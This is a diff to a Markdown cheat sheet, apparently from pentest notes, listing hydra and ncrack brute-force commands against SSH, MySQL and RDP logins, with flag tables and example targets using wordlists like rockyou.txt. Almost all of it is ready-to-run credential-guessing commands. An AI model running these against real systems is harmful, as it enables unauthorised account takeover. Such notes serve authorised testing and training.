@@ -1,10 +1,10 @@
 ## hydra
 
-__ssh__
+**ssh**
 
 sudo hydra -l root -P wordlist.TXT ssh：//192.168.136.142
 
-__mysql__
+**mysql**
 
 ```sh
 -l <user_string>
@@ -32,29 +32,34 @@ hydra -l wenber -V -x 3:3:1 rdp://127.0.0.1:3389
 ### -x 1:3:/  generate passwords from length 1 to 3 containing only slashes
 ### -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-
 
-# 3389 rdp
+```
+
+| param   | Description                                                                     |
+| ------- | ------------------------------------------------------------------------------- |
+| -f      | exit after the first found login/password pair (per host if -M)                 |
+| -F      | exit after the first found login/password pair for any host (for usage with -M) |
+| -C FILE | colon separated "login:pass" format, instead of -L/-P options                   |
+| -e nsr  | "n" for null password, additional checks,                                       |
+|         | "s" try login as pass                                                           |
+|         | "r" try the reverse login as pass                                               |
+
+## rdp/hydra
+
+```sh
 hydra -L user.txt -P pwd.txt 172.22.9.26 rdp -F -vV -e ns
 hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
 hydra rdp://192.168.1.1:3389 -l admin -p 123456 -V -F
-
 ```
 
-| param   | Description                                                  |
-| ------- | ------------------------------------------------------------ |
-| -f      | exit after the first found login/password pair (per host if -M) |
-| -F      | exit after the first found login/password pair for any host (for usage with -M) |
-| -C FILE | colon separated "login:pass" format, instead of -L/-P options |
-| -e nsr  | "n" for null password, additional checks,                    |
-|         | "s" try login as pass                                        |
-|         | "r" try the reverse login as pass                            |
+## rdp/御剑RDP爆破工具
 
-## ncrack 3389 rdp 爆破
+## rdp/ncrack 3389 rdp 爆破
+
 ```sh
 ncrack -p 3389 -v -user admin -pass 123456 192.168.52.0/24
 ncrack -p 3389 -v -user admin -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
 ncrack -p 3389 -v -user admin -pass 123456Aa@@ 192.168.52.143
 
 # -T<0-5> 越高越快
-ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt 
-
+ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt
 ```
